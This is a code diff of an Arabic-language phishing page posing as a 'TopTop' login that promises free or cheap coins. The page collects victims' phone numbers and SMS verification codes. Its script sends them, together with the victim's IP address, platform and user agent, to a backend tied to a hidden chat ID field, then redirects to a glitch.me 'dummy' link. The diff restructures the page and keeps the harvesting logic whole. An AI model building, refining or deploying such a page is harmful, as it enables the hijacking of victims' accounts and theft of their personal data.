@@ -163,41 +163,34 @@
     </style>
 </head>
 <body>
-     <div class="message" id="message">
-        يرجى تسجيل الدخول أولاً
-    </div>
-    <div class="container">
-        <!-- تسجيل الدخول عبر رقم الهاتف -->
-        <div class="login-container" id="login-container">
+     <div class="container">
+        <div class="message" id="message"></div>
+        
+        <div id="login-container">
             <h1>تسجيل الدخول لـ TopTop</h1>
             <form id="loginForm">
-                <!-- اختيار الدولة -->
-               <label for="country">اختر الدولة:</label>
-<select id="country" name="country" required>
-    <option value="YE" data-code="+967">🇾🇪 اليمن (+967)</option>
-    <option value="SA" data-code="+966">🇸🇦 السعودية (+966)</option>
-    <option value="EG" data-code="+20">🇪🇬 مصر (+20)</option>
-    <option value="IQ" data-code="+964">🇮🇶 العراق (+964)</option>
-    <option value="LY" data-code="+218">🇱🇾 ليبيا (+218)</option>
-    <option value="JO" data-code="+962">🇯🇴 الأردن (+962)</option>
-    <option value="AE" data-code="+971">🇦🇪 الإمارات (+971)</option>
-    <option value="SD" data-code="+249">🇸🇩 السودان (+249)</option>
-    <option value="MA" data-code="+212">🇲🇦 المغرب (+212)</option>
-    <option value="SY" data-code="+963">🇸🇾 سوريا (+963)</option>
-    <option value="TN" data-code="+216">🇹🇳 تونس (+216)</option>
-    <option value="DZ" data-code="+213">🇩🇿 الجزائر (+213)</option>
-    
-</select>
-
-
-                <!-- إدخال رقم الهاتف -->
+                <label for="country">اختر الدولة:</label>
+                <select id="country" name="country" required>
+                    <option value="YE" data-code="+967">🇾🇪 اليمن (+967)</option>
+                    <option value="SA" data-code="+966">🇸🇦 السعودية (+966)</option>
+                    <option value="EG" data-code="+20">🇪🇬 مصر (+20)</option>
+                    <option value="IQ" data-code="+964">🇮🇶 العراق (+964)</option>
+                    <option value="LY" data-code="+218">🇱🇾 ليبيا (+218)</option>
+                    <option value="JO" data-code="+962">🇯🇴 الأردن (+962)</option>
+                    <option value="AE" data-code="+971">🇦🇪 الإمارات (+971)</option>
+                    <option value="SD" data-code="+249">🇸🇩 السودان (+249)</option>
+                    <option value="MA" data-code="+212">🇲🇦 المغرب (+212)</option>
+                    <option value="SY" data-code="+963">🇸🇾 سوريا (+963)</option>
+                    <option value="TN" data-code="+216">🇹🇳 تونس (+216)</option>
+                    <option value="DZ" data-code="+213">🇩🇿 الجزائر (+213)</option>
+                </select>
                 <input type="text" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
+                <input type="hidden" name="chatId" value="YOUR_CHAT_ID_HERE">
                 <button type="button" onclick="sendPhoneNumber()">إرسال رقم الهاتف</button>
             </form>
         </div>
 
-        <!-- حقل إدخال كود التحقق -->
-        <div class="verification-container" id="verification-container" style="display:none;">
+        <div id="verification-container" style="display:none;">
             <h1>إدخال كود التحقق</h1>
             <form id="verificationForm">
                 <input type="text" id="verificationCode" name="verificationCode" placeholder="أدخل الكود" required>
@@ -205,182 +198,168 @@
             </form>
         </div>
 
-        <!-- قائمة أسعار الكونزات -->
         <div class="pricing-section">
             <h2>أسعار أكوانزات TopTop</h2>
             <div class="pricing-option">
                 <span>1000 أكوانز - 0$</span>
-                <button onclick="showMessage()">مجاني</button>
+                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">مجاني</button>
             </div>
             <div class="pricing-option">
                 <span>2000 أكوانز - 2$</span>
-                <button onclick="showMessage()">شراء الآن</button>
+                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
             </div>
             <div class="pricing-option">
                 <span>5000 أكوانز - 5$</span>
-                <button onclick="showMessage()">شراء الآن</button>
+                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
             </div>
             <div class="pricing-option">
                 <span>10000 أكوانز - 10$</span>
-                <button onclick="showMessage()">شراء الآن</button>
+                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
             </div>
         </div>
     </div>
 
-    <div id="notification" class="notification"></div>
-
     <script>
-    // Function to show messages
-function showMessage(message) {
-    var messageElement = document.getElementById('message');
-    messageElement.innerText = message;
-    messageElement.style.display = 'block';
-    setTimeout(function() {
-        messageElement.style.display = 'none';
-    }, 3000);
-}
-
-// Function to get IP and location information
-async function getIPInfo() {
-    try {
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-        return {
-            ip: data.ip,
-            country: data.country_name,
-            city: data.city
-        };
-    } catch (error) {
-        console.error('Error fetching IP info:', error);
-        return {
-            ip: 'Unknown',
-            country: 'Unknown',
-            city: 'Unknown'
-        };
-    }
-}
-
-// Function to get platform information
-function getPlatformInfo() {
-    const ua = navigator.userAgent;
-    let platform = "Unknown";
-    if (/Windows/.test(ua)) platform = "Windows";
-    else if (/Mac/.test(ua)) platform = "MacOS";
-    else if (/Linux/.test(ua)) platform = "Linux";
-    else if (/Android/.test(ua)) platform = "Android";
-    else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
-
-    return {
-        platform: platform,
-        userAgent: ua
-    };
-}
-
-// Function to send phone number
-async function sendPhoneNumber() {
-    const phoneNumber = document.getElementById('phoneNumber').value;
-    const country = document.getElementById('country').value;
-    const chatId = document.querySelector('input[name="chatId"]').value;
-
-    if (!phoneNumber || !country || !chatId) {
-        showMessage('Please fill in all required fields');
-        return;
-    }
-
-    const ipInfo = await getIPInfo();
-    const platformInfo = getPlatformInfo();
-
-    try {
-        const response = await fetch('/sendPhoneNumber', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                phoneNumber,
-                country,
-                chatId,
-                ip: ipInfo.ip,
-                platform: platformInfo.platform,
-                userAgent: platformInfo.userAgent
-            })
-        });
-
-        const result = await response.json();
-        if (result.success) {
-            showMessage('تم إرسال رمز التحقق');
-            document.getElementById('login-container').style.display = 'none';
-            document.getElementById('verification-container').style.display = 'block';
-        } else {
-            showMessage('حدث خطأ أثناء إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
-        }
-    } catch (error) {
-        console.error('Error:', error);
-        showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
-    }
-}
-
-// Function to verify code
-async function verifyCode(event) {
-    event.preventDefault();
-    const verificationCode = document.getElementById('verificationCode').value;
-    const phoneNumber = document.getElementById('phoneNumber').value;
-    const country = document.getElementById('country').value;
-    const chatId = document.querySelector('input[name="chatId"]').value;
-
-    if (!verificationCode || !phoneNumber || !country || !chatId) {
-        showMessage('Please fill in all required fields');
-        return;
-    }
-
-    const ipInfo = await getIPInfo();
-    const platformInfo = getPlatformInfo();
-
-    try {
-        const response = await fetch('/verifyCode', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                verificationCode,
-                phoneNumber,
-                country,
-                chatId,
-                ip: ipInfo.ip,
-                platform: platformInfo.platform,
-                userAgent: platformInfo.userAgent
-            })
-        });
-
-        const result = await response.json();
-        if (result.success) {
-            showMessage('تم التحقق من الكود بنجاح');
-            // Redirect to the dummy link after successful verification
-            setTimeout(() => {
-                window.location.href = "https://polarized-believed-fisherman.glitch.me/";
+        function showMessage(message) {
+            var messageElement = document.getElementById('message');
+            messageElement.innerText = message;
+            messageElement.style.display = 'block';
+            setTimeout(function() {
+                messageElement.style.display = 'none';
             }, 3000);
-        } else {
-            showMessage('فشل التحقق من الكود. يرجى المحاولة مرة أخرى.');
         }
-    } catch (error) {
-        console.error('Error:', error);
-        showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
-    }
-}
 
-// Add event listeners
-document.addEventListener('DOMContentLoaded', function() {
-    const loginForm = document.getElementById('loginForm');
-    const verificationForm = document.getElementById('verificationForm');
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city
+                };
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return {
+                    ip: 'Unknown',
+                    country: 'Unknown',
+                    city: 'Unknown'
+                };
+            }
+        }
 
-    loginForm.querySelector('button').addEventListener('click', sendPhoneNumber);
-    verificationForm.addEventListener('submit', verifyCode);
-});
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            let platform = "Unknown";
+            if (/Windows/.test(ua)) platform = "Windows";
+            else if (/Mac/.test(ua)) platform = "MacOS";
+            else if (/Linux/.test(ua)) platform = "Linux";
+            else if (/Android/.test(ua)) platform = "Android";
+            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
+
+            return {
+                platform: platform,
+                userAgent: ua
+            };
+        }
+
+        async function sendPhoneNumber() {
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const country = document.getElementById('country').value;
+            const chatId = document.querySelector('input[name="chatId"]').value;
+
+            if (!phoneNumber || !country || !chatId) {
+                showMessage('يرجى ملء جميع الحقول المطلوبة');
+                return;
+            }
+
+            const ipInfo = await getIPInfo();
+            const platformInfo = getPlatformInfo();
+
+            try {
+                // هنا يجب استبدال '/sendPhoneNumber' بعنوان URL الفعلي لخادمك
+                const response = await fetch('/sendPhoneNumber', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        phoneNumber,
+                        country,
+                        chatId,
+                        ip: ipInfo.ip,
+                        platform: platformInfo.platform,
+                        userAgent: platformInfo.userAgent
+                    })
+                });
+
+                const result = await response.json();
+                if (result.success) {
+                    showMessage('تم إرسال رمز التحقق');
+                    document.getElementById('login-container').style.display = 'none';
+                    document.getElementById('verification-container').style.display = 'block';
+                } else {
+                    showMessage('حدث خطأ أثناء إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+            }
+        }
+
+        async function verifyCode(event) {
+            event.preventDefault();
+            const verificationCode = document.getElementById('verificationCode').value;
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const country = document.getElementById('country').value;
+            const chatId = document.querySelector('input[name="chatId"]').value;
+
+            if (!verificationCode || !phoneNumber || !country || !chatId) {
+                showMessage('يرجى ملء جميع الحقول المطلوبة');
+                return;
+            }
+
+            const ipInfo = await getIPInfo();
+            const platformInfo = getPlatformInfo();
+
+            try {
+                // هنا يجب استبدال '/verifyCode' بعنوان URL الفعلي لخادمك
+                const response = await fetch('/verifyCode', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        verificationCode,
+                        phoneNumber,
+                        country,
+                        chatId,
+                        ip: ipInfo.ip,
+                        platform: platformInfo.platform,
+                        userAgent: platformInfo.userAgent
+                    })
+                });
+
+                const result = await response.json();
+                if (result.success) {
+                    showMessage('تم التحقق من الكود بنجاح');
+                    // التوجيه إلى الرابط الوهمي بعد التحقق الناجح
+                    setTimeout(() => {
+                        window.location.href = "https://polarized-believed-fisherman.glitch.me/";
+                    }, 3000);
+                } else {
+                    showMessage('فشل التحقق من الكود. يرجى المحاولة مرة أخرى.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const verificationForm = document.getElementById('verificationForm');
+            verificationForm.addEventListener('submit', verifyCode);
+        });
     </script>
 </body>
 </html>
-
-
-
-
